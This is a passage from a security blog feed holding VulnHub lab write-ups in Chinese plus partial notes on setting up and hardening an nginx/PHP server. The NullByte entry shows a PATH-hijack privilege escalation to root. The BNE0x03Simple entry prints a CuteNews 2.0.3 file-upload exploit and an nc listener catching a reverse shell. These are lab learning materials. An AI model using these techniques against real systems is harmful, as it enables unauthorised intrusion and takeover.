fe80::a00:27ff:fe1c:d6f/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">ramses@NullByte:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for ramses: </span><br><span class="hljs-string">Sorry, user ramses may not run sudo on NullByte.</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 s 权限的时候发现一个特殊文件，位于 backup 目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/home$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>273365  552 -rwsr-xr-x   1 root     root       562536 Mar 23  2015 /usr/lib/openssh/ssh-keysign<br>274287   16 -rwsr-xr-x   1 root     root        13796 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>267213    8 -rwsr-xr-x   1 root     root         5372 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>261444   12 -rwsr-xr-x   1 root     root         9540 Apr 15  2015 /usr/lib/pt_chown<br>271482  356 -rwsr-xr--   1 root     messagebus   362672 May 28  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>273383   96 -rwsr-sr-x   1 root     mail        96192 Feb 12  2015 /usr/bin/procmail<br>272955   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at<br>265920   52 -rwsr-xr-x   1 root     root        52344 Nov 20  2014 /usr/bin/chfn<br>263697   40 -rwsr-xr-x   1 root     root        38740 Nov 20  2014 /usr/bin/newgrp<br>265925   44 -rwsr-xr-x   1 root     root        43576 Nov 20  2014 /usr/bin/chsh<br>265924   80 -rwsr-xr-x   1 root     root        78072 Nov 20  2014 /usr/bin/gpasswd<br>274292   20 -rwsr-xr-x   1 root     root        18064 Nov 28  2014 /usr/bin/pkexec<br>265921   52 -rwsr-xr-x   1 root     root        53112 Nov 20  2014 /usr/bin/passwd<br>278443  176 -rwsr-xr-x   1 root     root       176400 Mar 12  2015 /usr/bin/sudo<br>273033 1056 -rwsr-xr-x   1 root     root      1081076 Feb 18  2015 /usr/sbin/exim4<br>391947    8 -rwsr-xr-x   1 root     root         4932 Aug  2  2015 /var/www/backup/procwatch<br>519235   40 -rwsr-xr-x   1 root     root        38868 Nov 20  2014 /bin/su<br>519210   36 -rwsr-xr-x   1 root     root        34684 Mar 30  2015 /bin/mount<br>519212   28 -rwsr-xr-x   1 root     root        26344 Mar 30  2015 /bin/umount<br>   149   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs<br><br></code></pre></td></tr></table></figure><p>cat 去查看&#x2F;var&#x2F; www&#x2F;backup&#x2F;procwatch 文件，似乎是 gcc 编译后得到的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/home$ <span class="hljs-built_in">ls</span> -liah /var/www/backup/procwatch<br>391947 -rwsr-xr-x 1 root root 4.9K Aug  2  2015 /var/www/backup/procwatch<br></code></pre></td></tr></table></figure><p>运行一下试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch<br>  PID TTY          TIME CMD<br> 1485 pts/0    00:00:00 procwatch<br> 1486 pts/0    00:00:00 sh<br> 1487 pts/0    00:00:00 ps<br></code></pre></td></tr></table></figure><p>似乎是调用了 sh 和 ps，这里的提权方法需要记忆一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps<br>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH<br>ramses@NullByte:/var/www/backup$ ./procwatch <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br>root<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /root</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>proof.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> pro</span>  <br>cat: pro: No such file or directory<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> proof.txt</span><br>adf11c7a9e6523e630aaf3b9b7acb51d<br><br>It seems that you have pwned the box, congrats. <br>Now you done that I wanna talk with you. Write a walk &amp; mail at<br>xly0n@sigaint.org attach the walk and proof.txt<br>If sigaint.org is down you may mail at nbsly0n@gmail.com<br><br><br>USE THIS PGP PUBLIC KEY<br><br>-----BEGIN PGP PUBLIC KEY BLOCK-----<br>Version: BCPG C# v1.6.1.0<br><br>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ<br>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT<br>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq<br>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK<br>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe<br>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu<br>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS<br>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q<br>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn<br>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58<br>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8<br>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU<br>Gms=<br>=PiAQ<br>-----END PGP PUBLIC KEY BLOCK-----<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/05/98cd5798d7a5.html"/>
    <url>/2023/05/98cd5798d7a5.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>任务目标：准备学习环境，学习 web 服务器的搭建过程，并做相应的加固学习。<br>电脑要求：必须有一台自己的电脑，配置最好高一点，自己用着舒服就行。<br>操作系统：主机不限制操作系统，需要安装虚拟机。<br>推荐环境：linux+nginx+php-fpm+mysql（为后续搭建 nginx+lua 的 waf 做准备，不可以使用集成好的环境）。<br>报告要求：将整个环境的搭建过程进行详细记录，收集网络上的加固文档，学习加固技术，从而思考不加固可能存在的安全问题，对于加固的过程以及对于安全的思考都需要做详细的记录.<br>最终目标：能够运行 php 代码并且可以使用 php 连接 mysql，成功执行 mysql 的语句<br>拓展任务：除了这个 web 环境还有其他的环境可以搭建，能力强者可以做更多的练习，比如：基于 apache 的环境、基于 Windows server 的 iis 环境等</p></blockquote><h1 id="web-运行基础环境搭建与加固"><a href="#web-运行基础环境搭建与加固" class="headerlink" title="web 运行基础环境搭建与加固"></a>web 运行基础环境搭建与加固</h1><h2 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建</h2><h3 id="Vmware-和-Ubuntu-20-04-安装和换源"><a href="#Vmware-和-Ubuntu-20-04-安装和换源" class="headerlink" title="Vmware 和 Ubuntu 20.04 安装和换源"></a>Vmware 和 Ubuntu 20.04 安装和换源</h3><p>使用的是 VMware 虚拟机，Linux 版本为 Ubuntu 20.04，安装过程比较简单，就不细致描述了，可以参考 <a href="https://zhuanlan.zhihu.com/p/141033713">2020最新版 VMware 安装 Ubuntu20.04教程</a>。安装成功的截图如下</p><p><img src="/pic/651a552d78cd0efde0bb553965bd05f9_MD5.png"></p><p>看一下 Ubuntu 的内核和版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">e135@ubuntu:~$  lsb_release -a <br>No LSB modules are available.<br>Distributor ID:Ubuntu<br>Description:Ubuntu 20.04.2 LTS<br>Release:20.04<br>Codename:focal<br>e135@ubuntu:~$ <span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 5.15.0-46-generic <span class="hljs-comment">#49~20.04.1-Ubuntu SMP Thu Aug 4 19:15:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>因为要考虑系统的安全性，这里先更新一下系统（很久以前的 Ubuntu 系统，下载后一直没更新过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">e135@ubuntu:~$ sudo apt-get update<br>Hit:1 http://mirrors.aliyun.com/ubuntu focal InRelease<br>Hit:2 http://mirrors.aliyun.com/ubuntu focal-security InRelease<br>Hit:3 http://mirrors.aliyun.com/ubuntu focal-updates InRelease<br>Hit:4 http://mirrors.aliyun.com/ubuntu focal-backports InRelease<br>Reading package lists... Done<br>e135@ubuntu:~$ sudo apt-get upgrade<br></code></pre></td></tr></table></figure><p>更新后遇到一个提示</p><p><img src="/pic/b8ee50aa50d418d074ae0a178ed4b138_MD5.png"></p><p>搜索发现一个答案</p><p><img src="/pic/aa186fc60ad9b71154dba673aed92898_MD5.png"></p><p>也可以使用可视化界面进行更新（不知道为什么执行 upgrade 并没有将所有软件进行更新，在可视化界面中倒是可以进一步更新）</p><p><img src="/pic/ea8db5207e4dd6cbc48325b0dbd62ede_MD5.png"></p><p>看一眼内核和版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">e135@ubuntu:~$ <span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 5.15.0-72-generic <span class="hljs-comment">#79~20.04.1-Ubuntu SMP Thu Apr 20 22:12:07 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br>e135@ubuntu:~$ lsb_release -a<br>No LSB modules are available.<br>Distributor ID:Ubuntu<br>Description:Ubuntu 20.04.6 LTS<br>Release:20.04<br>Codename:focal<br></code></pre></td></tr></table></figure><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="nginx-安装"><a href="#nginx-安装" class="headerlink" title="nginx 安装"></a>nginx 安装</h3><p>相比于之前，的确升级了，接下来我们可以开始考虑安装所必须的软件了</p><p><code>sudo apt-get install nginx</code></p><p>启动 nignx 检查是否有错误</p><p><code>sudo systemctl start nginx </code></p><p>安装 php 及相关 extention</p><p><code>sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath</code></p><p>正常情况下安装完成后会自动启动，以下指令检查是否正常启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status php7.4-fpm.service<br>ps aux | grep php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BNE0x03Simple靶机</title>
    <link href="/2023/05/877acee13580.html"/>
    <url>/2023/05/877acee13580.html</url>
    
    <content type="html"><![CDATA[<h1 id="BNE0x03Simple-靶机"><a href="#BNE0x03Simple-靶机" class="headerlink" title="BNE0x03Simple 靶机"></a>BNE0x03Simple 靶机</h1><blockquote><p>CuteCMS2.0.3公开漏洞利用，超贴心的利用文件，将标准化的挖洞和渗透过程，几乎以手把手的方式教给你。内核提权本次靶机演示遇到了很多问题，小小的翻车现场，也是真实渗透内核提权过程的展现，面对现实，汲取教训。很容易的一台机器，但也很有思考的价值。</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.104<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.000093s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.83 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.104 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00036s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Please Login / CuteNews<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.14 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80 192.168.56.104  <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:42 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00031s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /rss.php: RSS or Atom feed</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.104<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.104:80/<br>|     Form <span class="hljs-built_in">id</span>: login_form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/?register<br>|     Form <span class="hljs-built_in">id</span>: regpassword<br>|     Form action: /index.php?register<br>|     <br>|     Path: http://192.168.56.104:80/?register&amp;lostpass<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/index.php<br>|     Form <span class="hljs-built_in">id</span>: login_form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/index.php?register<br>|     Form <span class="hljs-built_in">id</span>: regpassword<br>|_    Form action: /index.php?register<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 321.44 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="Web-界面查看"><a href="#Web-界面查看" class="headerlink" title="Web 界面查看"></a>Web 界面查看</h2><p>发现是一个登录界面，包含了版本号和产品名，尝试使用 searchsploit 来搜索漏洞</p><p><img src="/pic/668cfbf996163457d0baf262e9ba6d46_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit CuteNews 2.0                             <br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                                            |  Path<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                                                    | php/webapps/37474.txt<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>下载文件到本地，查看内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit -m 37474<br>  Exploit: CuteNews 2.0.3 - Arbitrary File Upload<br>      URL: https://www.exploit-db.com/exploits/37474<br>     Path: /usr/share/exploitdb/exploits/php/webapps/37474.txt<br>File Type: ASCII text<br><br>Copied to: /home/kali/37474.txt<br><br><br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cat</span> 37474.txt <br>          CuteNews 2.0.3 Remote File Upload Vulnerability<br>        =================================================<br>1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0<br>0     _                   __           __       __                     1<br>1   /<span class="hljs-string">&#x27; \            __  /&#x27;</span>__`\        /\ \__  /<span class="hljs-string">&#x27;__`\                   0</span><br><span class="hljs-string">0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1</span><br><span class="hljs-string">1  \/_/\ \ /&#x27;</span> _ `\ \/\ \/_/_\_&lt;_  /<span class="hljs-string">&#x27;___\ \ \/\ \ \ \ \/\`&#x27;</span>__\          0<br>0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1<br>1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0<br>0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1<br>1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0<br>0                   \/___/          <span class="hljs-built_in">type</span> (<span class="hljs-built_in">local</span>, remote, DoS, etc.)    1<br>1                                                                      1<br>0  [+] Site            : Inj3ct0r.com                                  0<br>1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1<br>0                                                                      0<br>1               <span class="hljs-comment">##########################################             1</span><br>0               I\<span class="hljs-string">&#x27;m T0x!c member from Inj3ct0r Team             1</span><br><span class="hljs-string">1               ##########################################             0</span><br><span class="hljs-string">0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># Exploit Title: CuteNews 2.0.3 Remote File Upload Vulnerability</span><br><span class="hljs-string"># Date: [02/07/2015]</span><br><span class="hljs-string"># Exploit Author: [T0x!c]</span><br><span class="hljs-string"># Facebook: https://www.facebook.com/Dz.pr0s</span><br><span class="hljs-string"># Vendor Homepage: [http://cutephp.com/]</span><br><span class="hljs-string"># Software Link: [http://cutephp.com/cutenews/cutenews.2.0.3.zip]</span><br><span class="hljs-string"># Version: [2.0.3]</span><br><span class="hljs-string"># Tested on: [Windows 7]</span><br><span class="hljs-string"># greetz to :Tr00n , Kha&amp;mix , Cc0de  , Ghosty , Ked ans , Caddy-dz .....</span><br><span class="hljs-string">==========================================================</span><br><span class="hljs-string"> # Exploit  :</span><br><span class="hljs-string"></span><br><span class="hljs-string">Vuln : http://127.0.0.1/cutenews/index.php?mod=main&amp;opt=personal</span><br><span class="hljs-string"></span><br><span class="hljs-string"> 1 - Sign up for New User</span><br><span class="hljs-string"> 2 - Log In</span><br><span class="hljs-string"> 3 - Go to Personal options http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</span><br><span class="hljs-string"> 4 - Select Upload Avatar Example: Evil.jpg</span><br><span class="hljs-string"> 5 - use tamper data  &amp; Rename File Evil.jpg to Evil.php</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------2847913122899\r\nContent-Disposition: form-data; name=&quot;avatar_file&quot;; filename=&quot;Evil.php&quot;\r\</span><br><span class="hljs-string"></span><br><span class="hljs-string">6 - Your Shell : http://127.0.0.1/cutenews/uploads/avatar_Username_FileName.php</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Example: http://127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php</span><br></code></pre></td></tr></table></figure><h2 id="CuteCMS2-0-3-文件上传漏洞"><a href="#CuteCMS2-0-3-文件上传漏洞" class="headerlink" title="CuteCMS2.0.3 文件上传漏洞"></a>CuteCMS2.0.3 文件上传漏洞</h2><p>得到了非常详细的利用过程，我们按照提示来上传文件，我们使用 burpsuite 来实现对上传文件内容的修改</p><p><img src="/pic/c081ba1c56f571d5055984e086b78576_MD5.png"></p><p>200 上传成功，我们进入 uploads 目录试试</p><p><img src="/pic/428e4a66f7a28d9595259847a96671f4_MD5.png"></p><p>看来上传成功了，而且和漏洞文件里的提示是一致的，接下来我们开启监听，然后访问此 php 文件，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.104] 46398<br>Linux simple 3.16.0-30-generic <span class="hljs-comment">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 athlon i686 GNU/Linux</span><br> 22:51:10 up 20 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 